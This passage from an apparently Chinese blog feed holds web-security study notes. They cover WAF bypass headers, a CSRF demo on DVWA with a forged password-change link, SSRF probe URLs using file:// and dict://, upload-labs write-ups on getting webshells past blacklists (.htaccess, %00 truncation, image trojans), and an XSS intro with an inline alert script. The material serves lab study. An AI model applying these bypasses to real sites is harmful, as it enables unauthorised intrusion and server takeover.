print(urls+&#39;|&#39;+str(code))</code></pre><h2 id="sqlmap-temper脚本使用教程"><a href="#sqlmap-temper脚本使用教程" class="headerlink" title="sqlmap temper脚本使用教程"></a>sqlmap temper脚本使用教程</h2><p><a href="https://blog.csdn.net/qq_34444097/article/details/82717357">https://blog.csdn.net/qq_34444097/article/details/82717357</a></p><h2 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h2><p>方式一：IP白名单</p><p>通过对网站ip地址的伪造，知道对方网站ip地址，那就默认为ip地址为白名单。</p><p>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的ip，这样就饿可能存在伪造ip绕过的情况。</p><p>测试方法：修改http的header来by pass waf</p><pre><code>X-forwarded-forX-remote-IPX-remote-addrX-Real-IP</code></pre><p>方式二：静态资源</p><p>特定的静态资源后缀请求，常见的静态文件(.js、.jpg、.swf、.css等），类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。</p><p><a href="http://127.0.0.1/sql.php?id=1">http://127.0.0.1/sql.php?id=1</a></p><p><a href="http://127.0.0.1/sql.php/1.js?id=1">http://127.0.0.1/sql.php/1.js?id=1</a></p><p>备注：Aspx/php只识别到前面的.aspx/.php，后面基本不识别。</p><p><img src="https://s2.loli.net/2022/03/07/iRaKymxZogBM98S.png"></p><p>方式三：url白名单</p><p>为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。</p><p>只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势<br>涉及资源：</p><p><a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p><p><a href="https://blog.csdn.net/nzjdsds/article/details/93740686">https://blog.csdn.net/nzjdsds/article/details/93740686</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;知识点:&lt;br&gt;在MYsQL5.o以上版本中,mysql存在一个自带数据库名为&lt;br&gt;information_schema，它是一个存储记录有所有数掘库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;ht</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Web学习  SCRF &amp;&amp; SSRF</title>
    <link href="http://example.com/2022/03/16/CSRF&amp;SSRF/"/>
    <id>http://example.com/2022/03/16/CSRF&amp;SSRF/</id>
    <published>2022-03-16T08:09:39.810Z</published>
    <updated>2022-04-08T16:51:06.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SCRF-amp-amp-SSRF"><a href="#SCRF-amp-amp-SSRF" class="headerlink" title="SCRF &amp;&amp; SSRF"></a>SCRF &amp;&amp; SSRF</h1><p><img src="https://s2.loli.net/2022/03/15/mSkg3IOyhbzxacf.png"></p><p>csrf全称为：Cross-site request forgery，是一种常见的web攻击。在场景中，攻击者会伪造一个请求（通常是一个链接），然后欺骗目标用户点击，用户一旦点击，攻击也就完成了。</p><p>与xss的区别：csrf是借助用户的权限完成攻击，攻击者并没有拿到权限；而xss是直接盗取用户权限去进行破坏。</p><p>我们可以看到low难度的源代码中，并没有隐藏的token，这样我们的难度就小了很多。<br>然后我猜测这里的密码检测是直接将输入的进行拼接，检验password_new与password_conf是否一致。</p><p>于是可以先伪造一个简陋的链接：<br><a href="http://192.168.1.102/dvwa-master/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#">http://192.168.1.102/dvwa-master/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a><br>（注：里面的ip要改成自己的）</p><h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><p>1、当用户发送重要的请求时需要输入原始密码<br>2、设置随机 Token<br>3、检验 referer 来源，请求时判断请求链接是否为当前管理员正在使用的页面（管理员在编辑文章，<br>黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）<br>4、设置验证码<br>5、限制请求方式只能为 POST</p><p>代码演示<br>未进行 csrf 校验的 WebA<br>后端代码实现</p><pre><code>from flask import Flask, render_template, make_responsefrom flask import redirectfrom flask import requestfrom flask import url_forapp = Flask(__name__)@app.route(&#39;/&#39;, methods=[&quot;POST&quot;, &quot;GET&quot;])def index():    if request.method == &quot;POST&quot;:        # 取到表单中提交上来的参数        username = request.form.get(&quot;username&quot;)        password = request.form.get(&quot;password&quot;)        if not all([username, password]):            print(&#39;参数错误&#39;)        else:            print(username, password)            if username == &#39;laowang&#39; and password == &#39;1234&#39;:                # 状态保持，设置用户名到cookie中表示登录成功                response = redirect(url_for(&#39;transfer&#39;))                response.set_cookie(&#39;username&#39;, username)                return response            else:                print(&#39;密码错误&#39;)    return render_template(&#39;temp_login.html&#39;)@app.route(&#39;/transfer&#39;, methods=[&quot;POST&quot;, &quot;GET&quot;])def transfer():    # 从cookie中取到用户名    username = request.cookies.get(&#39;username&#39;, None)    # 如果没有取到，代表没有登录    if not username:        return redirect(url_for(&#39;index&#39;))    if request.method == &quot;POST&quot;:        to_account = request.form.get(&quot;to_account&quot;)        money = request.form.get(&quot;money&quot;)        print(&#39;假装执行转操作，将当前登录用户的钱转账到指定账户&#39;)        return &#39;转账 %s 元到 %s 成功&#39; % (money, to_account)    # 渲染转换页面    response = make_response(render_template(&#39;temp_transfer.html&#39;))    return responseif __name__ == &#39;__main__&#39;:    app.run(debug=True, port=9000)</code></pre><p>前端登录页面代码</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;登录&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;我是网站A，登录页面&lt;/h1&gt;&lt;form method=&quot;post&quot;&gt;    &lt;label&gt;用户名：&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;请输入用户名&quot;&gt;&lt;br/&gt;    &lt;label&gt;密码：&lt;/label&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;请输入密码&quot;&gt;&lt;br/&gt;    &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;前端转账页面代码&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;转账&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;我是网站A，转账页面&lt;/h1&gt;&lt;form method=&quot;post&quot;&gt;    &lt;label&gt;账户：&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;to_account&quot; placeholder=&quot;请输入要转账的账户&quot;&gt;&lt;br/&gt;    &lt;label&gt;金额：&lt;/label&gt;&lt;input type=&quot;number&quot; name=&quot;money&quot; placeholder=&quot;请输入转账金额&quot;&gt;&lt;br/&gt;    &lt;input type=&quot;submit&quot; value=&quot;转账&quot;&gt;&lt;/form&gt;</code></pre><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><img src="https://s2.loli.net/2022/03/15/blGVugXh7Qw9OJF.png"></p><p><img src="https://s2.loli.net/2022/03/15/anlIMmjthJPL5R9.png"></p><p>​什么是SSRF</p><p>服务器端请求伪造（SSRF）是指攻击者能够从易受攻击的Web应用程序发送精心设计的请求的对其他网站进行攻击。(利用一个可发起网络请求的服务当作跳板来攻击其他服务)</p><p>攻击者能够利用目标帮助攻击者访问其他想要攻击的目标</p><p>攻击者要求服务器为他访问URL</p><h2 id="SSRF作用"><a href="#SSRF作用" class="headerlink" title="SSRF作用"></a>SSRF作用</h2><p>端口扫描，指纹识别，漏洞利用，内网探针等</p><pre><code>探测各种协议http://192.168.64.144/phpmyadmin/file:///D:/www.txtdict://192.168.64.144:3306/infoftp://192.168.64.144:21</code></pre><p>探测网站的信息</p><p><img src="https://s2.loli.net/2022/03/15/Bd4Nap8UE6VyH7m.png"><br><img src="https://s2.loli.net/2022/03/15/5KPbj7vkOYfBCTo.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SCRF-amp-amp-SSRF&quot;&gt;&lt;a href=&quot;#SCRF-amp-amp-SSRF&quot; class=&quot;headerlink&quot; title=&quot;SCRF &amp;amp;&amp;amp; SSRF&quot;&gt;&lt;/a&gt;SCRF &amp;amp;&amp;amp; SSRF&lt;/h1&gt;&lt;p&gt;&lt;img</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Web学习 文件上传漏洞</title>
    <link href="http://example.com/2022/03/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2022/03/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-03-16T08:09:34.960Z</published>
    <updated>2022-04-08T16:50:17.330Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期的测试。</p><p><img src="https://s2.loli.net/2022/03/07/FkIE8U3sZcWwmSB.png"></p><p>常规类：扫描获取上传，会员中心上传，后台系统上传，各种途径上传</p><p>CMS类：已知CMS源码，搜索已知cms漏洞</p><p>编辑器类：ckeditor,fckeditor,kindeditor,xxxeditor，也是搜索相关编辑器漏洞</p><p>配合解析漏洞下的文件类型后门：可以通过解析漏洞，上传包含后门代码的图片</p><h1 id="上传方法"><a href="#上传方法" class="headerlink" title="上传方法"></a>上传方法</h1><p>方法一</p><pre><code>先直接传一个PHP，实战先传马。实战先传一个正常的图片，看看有无返回存储地址。如果能直接上传并解析，已离成功不远。</code></pre><p>方法二<br>    先传一个shell，然后进行修改。<br>    connect-Type:image/jpeg，看看是否可以进行绕过，如果不行，在上传内容添加GIF89a<br>    当然上传了还得看是否能够被解析为php，所有的上传都要考虑是否能够被解析。</p><p>方法三<br>    上传一个abc.abcd，目的只是为了查看是否为白名单还是黑名单绕过。<br>    黑名单限制一般为此文件类型不允许上传，考虑双写，大小写，空格，php2,php3,php4,php5,pht<br>    phtml,等方式<br>    我们继续上传一个/htaccess文件<br>    .htaccess文件能够设置服务器的解析文件的格式，匹配到dudu就已php的格式来解析，继而上传马<br>    如果说.htaccess不能上传，接下来上传一个.user.ini，继而上传一个马</p><p>方法四<br>    如果白名单限制上传<br>    考虑00截断上传<br>    文件包含漏洞+图片马<br>    文件包含漏洞+二次渲染+图片马</p><p> 方法五<br>    上传的东西是否被服务器很快的删除或者移除，或者说上传成功，但是无法访问，就得考虑条件竞争。<br>    以上均不行，考虑逻辑层面的思路。</p><p>涉及资源</p><p><a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><h1 id="后端黑白名单绕过"><a href="#后端黑白名单绕过" class="headerlink" title="后端黑白名单绕过"></a>后端黑白名单绕过</h1><p><img src="https://s2.loli.net/2022/03/07/aiUkwWcKQ23tbhu.png"></p><h2 id="文件上传常见验证"><a href="#文件上传常见验证" class="headerlink" title="文件上传常见验证"></a>文件上传常见验证</h2><p>后缀名（直接），类型（间接），文件头等 </p><h2 id="后缀名"><a href="#后缀名" class="headerlink" title="后缀名"></a>后缀名</h2><p>黑名单，白名单 </p><p>黑名单：</p><p>明确不允许上传的格式后缀</p><p>asp php jsp aspx cgi war 等</p><p>如果php phtml..没有定义到后名单里，可以用这格式绕过限制，依旧可以达到效果</p><h2 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h2><p>明确可以上传的格式后缀</p><p>jpg png zip rar gif 等 </p><p>要白名单验证要更安全</p><h2 id="文件类型：MIME-信息"><a href="#文件类型：MIME-信息" class="headerlink" title="文件类型：MIME 信息"></a>文件类型：MIME 信息</h2><p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，</p><p>当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式</p><p>Content-Type称之为MIME信息</p><h1 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h1><h2 id="upload-lab-01"><a href="#upload-lab-01" class="headerlink" title="upload-lab-01"></a>upload-lab-01</h2><p>由于采用了前端验证，所以可以通过抓包直接修改文件格式，从而绕过。</p><p><img src="https://s2.loli.net/2022/03/23/QCE41wxqontGHrL.gif"></p><h2 id="upload-lab-02"><a href="#upload-lab-02" class="headerlink" title="upload-lab-02"></a>upload-lab-02</h2><p>拦截上传shell.php的请求包，修改文件类型为：image/jpeg或者image/png或者image/gif</p><p><img src="https://s2.loli.net/2022/03/24/6Aca5fzwNdjobms.gif"><br><img src="https://s2.loli.net/2022/03/24/l5uALgperktxi4v.gif"></p><h2 id="upload-lab-03"><a href="#upload-lab-03" class="headerlink" title="upload-lab-03"></a>upload-lab-03</h2><p>采用了黑名单的过滤方式</p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if(!in_array($file_ext, $deny_ext)) &#123;            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH. &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;                 $img_path = UPLOAD_PATH .&#39;/&#39;. $_FILES[&#39;upload_file&#39;][&#39;name&#39;];                 $is_upload = true;            &#125;        &#125; else &#123;            $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><p>php,phps,php3,php5,pht等都有可能被解析成php文件的，当然这得取决apache的配置。先试试看，通过Burpsuite改包上传成功。</p><p><img src="https://s2.loli.net/2022/03/24/MlVKgHSwvrYZGjk.gif"></p><h2 id="upload-lab-04"><a href="#upload-lab-04" class="headerlink" title="upload-lab-04"></a>upload-lab-04</h2><p>利用 .htaccess 文件进行绕过</p><p>其内容为 AddType application/x-httpd-php .jpg </p><p>可以将jpg格式的文件作为php文件进行解析</p><p>先上传 .htaccess 文件再上传 hacker.jpg 文件</p><p><img src="https://s2.loli.net/2022/03/24/Ln3cIsklBDmi58P.gif"></p><h2 id="upload-lab-05"><a href="#upload-lab-05" class="headerlink" title="upload-lab-05"></a>upload-lab-05</h2><p>大小写绕过，window上搭载的服务器是不区分大小写的，而Linux上的服务器是区分的，所以win上搭载的服务器可以通过大小写绕过防护。</p><p><img src="https://s2.loli.net/2022/03/24/qeAldP92rawGfgJ.gif"></p><h2 id="upload-lab-06"><a href="#upload-lab-06" class="headerlink" title="upload-lab-06"></a>upload-lab-06</h2><p>还是黑名单限制，通过查看源代码，知道删除了文件名后面的., 但是并没有删除空格，所以通过上传一个后缀名再添加一个空格的文件去绕过黑名单，windoes在创建文件时会自动删掉最后的空格。</p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        if (!in_array($file_ext, $deny_ext)) &#123;            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;                $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name;                $is_upload = true;            &#125;        &#125; else &#123;            $msg = &#39;此文件不允许上传&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><p><img src="https://s2.loli.net/2022/03/23/dAVljKaMC1uJ7xH.gif"></p><h2 id="upload-lab-07"><a href="#upload-lab-07" class="headerlink" title="upload-lab-07"></a>upload-lab-07</h2><p>在第七行发现，原来是没有过滤末尾的点呀，吸取上一次的教训，直接修改后缀名在后面加.是不可以的，因为会被win自动过滤</p><p>所以还是使用抓包修改</p><p>1</p><p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess”);<br>        $file_name = trim($_FILES[‘upload_file’][‘name’]);<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = strtolower($file_ext); //转换为小写<br>        $file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA<br>        $file_ext = trim($file_ext); //首尾去空</p><pre><code>    if (!in_array($file_ext, $deny_ext)) &#123;        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;        if (move_uploaded_file($temp_file, $img_path)) &#123;            $is_upload = true;        &#125; else &#123;            $msg = &#39;上传出错！&#39;;        &#125;    &#125; else &#123;        $msg = &#39;此文件类型不允许上传！&#39;;    &#125;&#125; else &#123;    $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;&#125;</code></pre><p>}</p><p>2</p><p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”php1”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”pHp1”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”);<br>        $file_name = trim($_FILES[‘upload_file’][‘name’]);<br>        $file_name = deldot($file_name);//删除文件名末尾的点<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = strtolower($file_ext); //转换为小写<br>        $file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA<br>        $file_ext = trim($file_ext); //收尾去空</p><pre><code>    if (!in_array($file_ext, $deny_ext)) &#123;        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;        if (move_uploaded_file($temp_file, $img_path)) &#123;            $is_upload = true;        &#125; else &#123;            $msg = &#39;上传出错！&#39;;        &#125;    &#125; else &#123;        $msg = &#39;此文件不允许上传!&#39;;    &#125;&#125; else &#123;    $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;&#125;</code></pre><p>}</p><h2 id="upload-lab-08"><a href="#upload-lab-08" class="headerlink" title="upload-lab-08"></a>upload-lab-08</h2><p>和7一样的</p><p>$file_name = deldot($file_name);//删除文件名末尾的点</p><p>少了这个过滤，</p><p>所以我们可以进行文件名加点绕过。</p><p>Windows有个特性，就是如果文件名后缀以.或者空格结尾的，系统在保存文件时会自动去除点和空格。所以可以通过在文件名后面增加一个点来绕过限制</p><h2 id="upload-lab-09"><a href="#upload-lab-09" class="headerlink" title="upload-lab-09"></a>upload-lab-09</h2><p>源码截取</p><p>if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess”);<br>        $file_name = trim($_FILES[‘upload_file’][‘name’]);<br>        $file_name = deldot($file_name);//删除文件名末尾的点<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = strtolower($file_ext); //转换为小写<br>        $file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA<br>        $file_ext = trim($file_ext); //首尾去空</p><p>比起上面的，都进行了过滤和限制，但是存在逻辑漏洞</p><p>当我们构造一个 phpinfo.php. .的文件时</p><p>phpinfo.php. .　　–删除文件名末尾的点–&gt;phpinfo.php. </p><p>phpinfo.php. 　　 ——转换为小写———-&gt;phpinfo.php. </p><p>phpinfo.php. 　　 —去除字符串::$DATA–&gt;phpinfo.php. </p><p>phpinfo.php. 　　 ——-首尾去空————&gt;phpinfo.php.</p><p>phpinfo.php.　　  –后缀没有在黑名单中—&gt;成功上传—–&gt;解析时默认删除末尾的 . —&gt;最终等价于上传了phpinfo.php文件</p><p><img src="https://s2.loli.net/2022/03/24/UoPEfYyx1uiXr2t.gif"></p><h2 id="upload-lab-10"><a href="#upload-lab-10" class="headerlink" title="upload-lab-10"></a>upload-lab-10</h2><p>上传 10.pphphp 文件</p><p>后端黑名单中包含 ‘php’ , 会将php替换为空 , 但只替换一次 , 替换后的文件名为 10.php , 仍然可以正常使用</p><p><img src="https://s2.loli.net/2022/03/24/JngtwYSZAed5xEP.gif"></p><h2 id="upload-lab-11"><a href="#upload-lab-11" class="headerlink" title="upload-lab-11"></a>upload-lab-11</h2><p>%00截断</p><p>.pphphp</p><p>都不对，气死了</p><h2 id="upload-lab-12"><a href="#upload-lab-12" class="headerlink" title="upload-lab-12"></a>upload-lab-12</h2><p>利用%00url截断绕过</p><p><img src="https://s2.loli.net/2022/03/24/lHAomEN7pGrQ5ea.gif"></p><h2 id="upload-lab-13"><a href="#upload-lab-13" class="headerlink" title="upload-lab-13"></a>upload-lab-13</h2><p>也是利用%00url截断绕过，但是环境问题无法验证，需要低版本的php</p><h2 id="upload-lab-14"><a href="#upload-lab-14" class="headerlink" title="upload-lab-14"></a>upload-lab-14</h2><p><a href="https://blog.csdn.net/qq_42702981/article/details/118652121">制作图片木马https://blog.csdn.net/qq_42702981/article/details/118652121</a></p><p>存在文件包含漏洞</p><pre><code>&lt;?php/*本页面存在文件包含漏洞，用于测试图片马是否能正常运行！*/header(&quot;Content-Type:text/html;charset=utf-8&quot;);$file = $_GET[&#39;file&#39;];if(isset($file))&#123;    include $file;&#125;else&#123;    show_source(__file__);&#125;?&gt;</code></pre><p>判断了是否为图片</p><pre><code>function isImage($filename)&#123;    $types = &#39;.jpeg|.png|.gif&#39;;    if(file_exists($filename))&#123;        $info = getimagesize($filename);        $ext = image_type_to_extension($info[2]);        if(stripos($types,$ext))&#123;            return $ext;        &#125;else&#123;            return false;        &#125;    &#125;else&#123;        return false;    &#125;&#125;</code></pre><p>上传带有木马的jpg文件，通过文件包含漏洞执行</p><h2 id="upload-lab-15"><a href="#upload-lab-15" class="headerlink" title="upload-lab-15"></a>upload-lab-15</h2><p>与14相同</p><h2 id="upload-lab-16"><a href="#upload-lab-16" class="headerlink" title="upload-lab-16"></a>upload-lab-16</h2><p><a href="https://blog.csdn.net/u014029795/article/details/102908114">https://blog.csdn.net/u014029795/article/details/102908114</a></p><p>存在二次渲染，需要手动寻找未被修改的位置，写入payload.</p><p><a href="https://blog.csdn.net/u014029795/article/details/102908114">https://blog.csdn.net/u014029795/article/details/102908114</a></p><h2 id="upload-lab-17"><a href="#upload-lab-17" class="headerlink" title="upload-lab-17"></a>upload-lab-17</h2><p>条件竞争</p><p>通过不断发包从而达到效果，可以通过burp进行爆破</p><p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-17.html">https://www.fujieace.com/penetration-test/upload-labs-pass-17.html</a></p><h2 id="upload-lab-18"><a href="#upload-lab-18" class="headerlink" title="upload-lab-18"></a>upload-lab-18</h2><p>和17 相同</p><h2 id="upload-lab-19"><a href="#upload-lab-19" class="headerlink" title="upload-lab-19"></a>upload-lab-19</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h1&gt;&lt;p&gt;对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Web学习  XSS 跨站漏洞</title>
    <link href="http://example.com/2022/03/16/xss/"/>
    <id>http://example.com/2022/03/16/xss/</id>
    <published>2022-03-16T08:09:29.973Z</published>
    <updated>2022-04-08T16:51:07.892Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS-跨站漏洞"><a href="#XSS-跨站漏洞" class="headerlink" title="XSS 跨站漏洞"></a>XSS 跨站漏洞</h1><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><script>alert('xss')</script><p>跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p><p>攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。</p><p>xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。</p><h2 id="产生层面"><a href="#产生层面" class="headerlink" title="产生层面"></a>产生层面</h2><p>产生层面一般都是在前端，JavaScript代码能干什么，执行之后就会达到相应的效果</p><h2 id="函数类"><a href="#函数类" class="headerlink" title="函数类"></a>函数类</h2><p>比如说php中的脚本的输出函数</p><p>常见的输出函数有：print、print_r、echo、printf、sprintf、die、var_dump、var_export</p><p>XSS 跨站漏洞分类：</p><ol><li><p>反射型<br>&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。<br>发包 x=xiaodi =&gt; x.php =&gt; 回包</p></li><li><p>储存型<br>&lt;持久化&gt; 